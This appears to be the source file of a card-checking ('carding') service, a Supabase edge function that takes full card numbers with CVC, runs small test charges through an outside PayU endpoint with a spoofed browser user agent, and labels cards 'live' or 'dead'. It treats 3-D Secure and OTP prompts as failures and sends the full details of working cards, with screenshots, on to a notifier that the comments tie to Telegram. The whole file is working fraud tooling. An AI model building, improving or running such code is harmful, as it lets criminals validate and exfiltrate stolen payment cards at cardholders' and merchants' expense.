import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

// Call notify-charged-card edge function for live cards (fire-and-forget, non-blocking)
function notifyChargedCard(
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string,
  apiResponse?: string,
  screenshotUrl?: string
) {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  // Fire and forget - don't await
  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
      api_response: apiResponse,
      screenshot_url: screenshotUrl,
    }),
  }).catch(() => {});
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc, amount } = await req.json();

    if (!cc) {
      return new Response(
        JSON.stringify({ error: "Card details (cc) required" }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY
    const cardParts = cc.split('|');
    if (cardParts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC" }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNumber, mm, yy, cvc] = cardParts;
    
    // Validate CVC is present and valid (3-4 digits)
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits" }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Default amount to 1 if not provided
    const chargeAmount = amount || 1;

    // Call the PayU API (no timeout - let API complete naturally)
    const apiUrl = `https://payu.up.railway.app/${chargeAmount}/${cc}`;
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
      },
    });

    const responseText = await response.text();

    let data;
    try {
      data = JSON.parse(responseText);
    } catch {
      data = { raw: responseText };
    }

    // Determine status from response
    let status: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = responseText;
    let mcpAmount = "";

    const lowerResponse = responseText.toLowerCase();
    
    // Check for the response format: { status: "success", mcp: "0.01 USD", ... }
    if (data && typeof data === 'object') {
      // Extract MCP if present
      if (data.mcp) {
        mcpAmount = data.mcp;
      }
      
      // Check retryOptions.details for error indicators
      const retryDetails = data.transaction?.retryOptions?.details;
      
      // 🔥 LIVE CARD: When ALL error fields are "None" or null
      // { "error_message": "None", "error_title": "None", "failed": None, "error_code": "None" }
      const isErrorMessageNone = !retryDetails?.error_message || 
                                  retryDetails.error_message === "None" ||
                                  String(retryDetails.error_message).toLowerCase() === "none";
      const isErrorTitleNone = !retryDetails?.error_title || 
                                retryDetails.error_title === "None" ||
                                String(retryDetails.error_title).toLowerCase() === "none";
      const isFailedNone = retryDetails?.failed === null || 
                           retryDetails?.failed === undefined ||
                           retryDetails?.failed === "None" ||
                           String(retryDetails?.failed).toLowerCase() === "none" ||
                           retryDetails?.failed === false;
      const isErrorCodeNone = !retryDetails?.error_code || 
                              retryDetails.error_code === "None" ||
                              retryDetails.error_code === null ||
                              String(retryDetails.error_code).toLowerCase() === "none";
      
      // ALL error fields are None/null = CHARGED/LIVE
      const allErrorsNone = isErrorMessageNone && isErrorTitleNone && isFailedNone && isErrorCodeNone;
      
      console.log(`PayU Details Check - error_message: ${retryDetails?.error_message}, error_title: ${retryDetails?.error_title}, failed: ${retryDetails?.failed}, error_code: ${retryDetails?.error_code}`);
      console.log(`PayU All Errors None: ${allErrorsNone}`);
      
      // LIVE: status success + all error fields are None
      if (data.status === "success" && allErrorsNone) {
        status = "live";
        apiMessage = mcpAmount ? `CHARGED | MCP: ${mcpAmount}` : "CHARGED";
        console.log(`✅ LIVE CARD DETECTED - All errors None - MCP: ${mcpAmount || 'N/A'}`);
      }
      // DEAD: has any real error message/code/failed=true
      else if (data.status === "success" && !allErrorsNone) {
        status = "dead";
        if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_message;
        } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_title;
        } else {
          apiMessage = "Transaction Failed";
        }
        console.log(`❌ DEAD CARD - Has errors - ${apiMessage}`);
      }
      // DEAD: explicit failure status
      else if (data.status === "failed" || data.status === "error") {
        status = "dead";
        if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_message;
        } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_title;
        } else if (data.message) {
          apiMessage = data.message;
        }
        console.log(`❌ DEAD CARD - ${apiMessage}`);
      }
      // Check for error in retry details
      else if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
        status = "dead";
        apiMessage = retryDetails.error_message;
        console.log(`❌ DEAD CARD (error_message) - ${apiMessage}`);
      }
    }
    
    // 🔥 CHECK FOR ALL VERIFICATION TYPES in final_url - Mark as DECLINED
    const finalUrl = data?.transaction?.final_url || data?.final_url || "";
    const lowerFinalUrl = String(finalUrl).toLowerCase();
    
    // Comprehensive list of verification flow indicators
    const verificationKeywords = [
      "3ds",
      "3d-secure",
      "3dsecure",
      "threeds",
      "threedsecure",
      "three-d-secure",
      "authentication",
      "acs",
      "secure-acs",
      "secureacs",
      "wibmo",
      "creq",
      "otp",
      "verification",
      "verify",
      "challenge",
      "enrolled",
      "pareq",
      "pares",
      "vbv",
      "securecode",
      "verified-by-visa",
      "mastercard-securecode",
      "safekey",
      "protectbuy",
      "j-secure",
      "diners-protectbuy"
    ];
    
    const hasVerificationFlow = verificationKeywords.some(keyword => lowerFinalUrl.includes(keyword));
    
    if (hasVerificationFlow) {
      status = "dead";
      apiMessage = "DECLINED (Verification Required)";
      console.log(`❌ DEAD CARD - Verification flow detected in final_url: ${finalUrl}`);
    }
    // 🔥 CHECK FOR "VERIFICATION" in response text - Mark as DECLINED immediately
    else if (lowerResponse.includes("verification")) {
      status = "dead";
      const retryDetails = data?.transaction?.retryOptions?.details;
      if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
        apiMessage = retryDetails.error_message;
      } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
        apiMessage = retryDetails.error_title;
      } else {
        apiMessage = "VERIFICATION REQUIRED - DECLINED";
      }
      console.log(`❌ DEAD CARD - Verification required - ${apiMessage}`);
    }
    
    // Fallback: Check for failure indicators if status still unknown
    if (status === "unknown") {
      const hasFailureIndicators = 
          lowerResponse.includes("3d") || 
          lowerResponse.includes("3ds") ||
          lowerResponse.includes("verify") ||
          lowerResponse.includes("authenticate") ||
          lowerResponse.includes("otp") ||
          lowerResponse.includes("secure") ||
          lowerResponse.includes("redirect") ||
          lowerResponse.includes("declined") || 
          lowerResponse.includes("could not") ||
          lowerResponse.includes("transaction failed") ||
          lowerResponse.includes("invalid") ||
          lowerResponse.includes("insufficient") ||
          lowerResponse.includes("expired") ||
          lowerResponse.includes("rejected") ||
          lowerResponse.includes("\"failed\":true") ||
          lowerResponse.includes("\"failed\": true") ||
          (lowerResponse.includes("error_code") && 
           !lowerResponse.includes("\"error_code\":\"none\"") && 
           !lowerResponse.includes("\"error_code\": \"none\"") &&
           !lowerResponse.includes("\"error_code\":null") &&
           !lowerResponse.includes("\"error_code\": null")) ||
          lowerResponse.includes("try again");

      if (hasFailureIndicators) {
        status = "dead";
        const retryDetails = data?.transaction?.retryOptions?.details;
        if (retryDetails?.error_message && String(retryDetails.error_message).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_message;
        } else if (retryDetails?.error_title && String(retryDetails.error_title).toLowerCase() !== "none") {
          apiMessage = retryDetails.error_title;
        }
        console.log(`❌ DEAD CARD (fallback) - ${apiMessage}`);
      } else if (lowerResponse.includes("\"status\":\"success\"") || 
          lowerResponse.includes("\"status\": \"success\"") ||
          lowerResponse.includes("approved") || 
          lowerResponse.includes("charged") ||
          lowerResponse.includes("payment successful") ||
          lowerResponse.includes("transaction successful")) {
        status = "live";
        apiMessage = mcpAmount ? `CHARGED | MCP: ${mcpAmount}` : "CHARGED";
        console.log(`✅ LIVE CARD (fallback) - ${apiMessage}`);
      }
    }

    // 🔥 Extract screenshot URL if available from API response
    const screenshotUrl = data?.screenshot || data?.screenshot_url || data?.image || data?.image_url || null;

    // 🔥 Send Telegram notification for LIVE cards with FULL card details + screenshot (non-blocking)
    if (status === "live") {
      notifyChargedCard(
        user.id,
        cc,
        "CHARGED",
        apiMessage,
        mcpAmount || `₹${chargeAmount}`,
        "Yunchi PayU",
        responseText,
        screenshotUrl
      ); // Fire and forget
    }

    return new Response(
      JSON.stringify({
        status,
        apiStatus: status.toUpperCase(),
        apiMessage,
        amount: chargeAmount,
        mcp: mcpAmount || null
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : "Failed to process request";
    console.error('PayU Check Error:', errorMessage);
    
    return new Response(
      JSON.stringify({
        status: "unknown",
        apiStatus: "ERROR",
        apiMessage: errorMessage,
        rawResponse: errorMessage,
        mcp: null
      }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
